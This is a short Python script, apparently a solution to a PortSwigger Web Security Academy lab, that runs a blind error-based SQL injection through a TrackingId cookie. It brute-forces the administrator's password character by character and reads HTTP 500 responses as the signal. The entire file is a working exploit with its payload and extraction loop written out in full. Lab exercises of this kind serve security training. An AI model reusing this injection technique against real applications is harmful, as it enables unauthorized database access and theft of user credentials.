#!/usr/bin/env python3
import signal
import string
from pwn import *
import requests
import sys
def def_handler(sig, frame):
    print("[!] Saliendo...")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)
characters = string.ascii_letters + string.digits
def makeSQLi():
    p1 = log.progress("SQLi")
    p1.status("Iniciando ataque SQLi")
    
    time.sleep(2)
    
    password = ""
    p2 = log.progress("Password: ")
    for position in range(1,21):
        for char in characters:
             cookies = {
                'TrackingId': f"hCwBmQsXqeDojrmb' union select case when substr(password,{position},1)='{char}' then to_char(1/0) else '' end from users where username like 'administrator'-- -",
                'session':"n0vIPoiWzd99AsYZUaUm5janDGj9KA76"
             }
             p1.status(cookies["TrackingId"])
             r = requests.get("https://0a5700590442645c822b9df600ae006b.web-security-academy.net", cookies=cookies)
             if r.status_code == 500:
                 password += char
                 p2.status(password)
                 break
                 
                
  
if __name__ == "__main__":
    makeSQLi()
